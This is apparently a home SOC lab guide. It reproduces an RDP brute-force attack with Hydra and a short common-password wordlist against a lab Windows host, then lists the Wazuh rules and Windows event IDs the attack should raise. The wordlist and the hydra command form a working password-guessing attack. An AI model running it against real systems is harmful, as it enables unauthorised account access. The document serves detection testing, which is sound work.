# Attack 01 — RDP Brute-Force (reproduction)

**From:** SOC-LIN-01 (Kali, 10.10.30.103, VLAN 30 ATTACK)
**Against:** SOC-WIN-10 (10.10.10.150, VLAN 10 VICTIM)
**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing



---

## Wordlist

A short list keeps the attempt count readable. **Put the real password last**
so the run produces a clear failure burst before the success — otherwise an
early hit triggers too few 4625s and the aggregation rule (60204) never fires.

```bash
cat << 'EOF' > /tmp/rdp-pass.txt
password
admin
Admin123
Welcome1
letmein
Summer2024
Winter2024
P@ssw0rd
123456
qwerty
Passw0rd!
abc123
Correct
Password123
Password1
EOF
```

---

## Attack

```bash
hydra -l AdminLokalny -P /tmp/rdp-pass.txt rdp://10.10.10.150 -t 1 -w 5 -V
```

- `-t 1` — single thread. Hydra's RDP module is experimental and unreliable
  with multiple threads, especially against NLA-enabled targets.
- `-w 5` — wait between attempts; gives a deterministic result without
  disabling NLA on the target.

Expected tail of output:

```
[3389][rdp] host: 10.10.10.150   login: AdminLokalny   password: Password1
1 of 1 target successfully completed, 1 valid password found
```


---

## Expected telemetry in Wazuh

| Wazuh rule.id | Win Event ID | Meaning                                 |
| ------------- | ------------ | --------------------------------------- |
| 60122         | 4625         | individual failed logon                 |
| 60204         | 4625         | aggregated failure burst                |
| 92657         | 4624         | successful logon (local child of 60106) |
| 67028         | 4672         | special privileges assigned             |

